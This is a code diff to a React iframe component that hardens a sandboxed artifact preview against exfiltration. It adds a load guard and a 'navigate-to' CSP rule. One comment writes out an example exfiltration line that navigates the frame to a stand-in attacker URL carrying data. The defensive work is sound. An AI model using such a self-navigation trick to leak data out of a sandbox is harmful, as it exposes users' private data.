@@ -1,4 +1,4 @@
-import { memo, useMemo, type FC } from 'react';
+import { memo, useCallback, useMemo, useRef, type FC } from 'react';
 import type { ArtifactType } from '@/providers/ArtifactProvider';
 import { MarkdownText } from '@/components/thread/MarkdownText';
 import { CodeBlock } from '@/components/thread/CodeBlock';
@@ -10,15 +10,32 @@ import { CodeBlock } from '@/components/thread/CodeBlock';
  * `allow-same-origin` so artifact scripts cannot reach `window.app`,
  * cookies, localStorage, or the parent DOM.
  */
-const SandboxedFrame: FC<{ srcDoc: string; title: string }> = memo(({ srcDoc, title }) => (
-  <iframe
-    title={title}
-    srcDoc={srcDoc}
-    sandbox="allow-scripts"
-    referrerPolicy="no-referrer"
-    className="h-full w-full border-0 bg-white"
-  />
-));
+const SandboxedFrame: FC<{ srcDoc: string; title: string }> = memo(({ srcDoc, title }) => {
+  // A sandboxed srcdoc frame can still exfiltrate by navigating ITSELF
+  // (location.href = 'https://attacker/?data'), which connect-src doesn't
+  // cover. The CSP adds `navigate-to 'none'`; this onLoad guard is defense in
+  // depth — if the frame ever loads something other than its initial srcdoc
+  // document, blank it. (allow-top-navigation is already withheld.)
+  const initialLoad = useRef(true);
+  const handleLoad = useCallback((e: React.SyntheticEvent<HTMLIFrameElement>) => {
+    if (initialLoad.current) {
+      initialLoad.current = false;
+      return;
+    }
+    // Any subsequent load = navigation attempt. Reset to a blank sandboxed doc.
+    e.currentTarget.srcdoc = '<!doctype html><meta charset="utf-8"><title>blocked</title>';
+  }, []);
+  return (
+    <iframe
+      title={title}
+      srcDoc={srcDoc}
+      sandbox="allow-scripts"
+      referrerPolicy="no-referrer"
+      onLoad={handleLoad}
+      className="h-full w-full border-0 bg-white"
+    />
+  );
+});
 
 const BASE_STYLES =
   'body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,sans-serif;color:#0f172a;background:#ffffff}*,*::before,*::after{box-sizing:border-box}';
@@ -43,6 +60,7 @@ function cspMeta(mode: 'static' | 'react'): string {
     'font-src data:',
     `connect-src ${connectSrc}`,
     "form-action 'none'",
+    "navigate-to 'none'",
     "base-uri 'none'",
   ].join('; ');
   return `<meta http-equiv="Content-Security-Policy" content="${policy}">`;
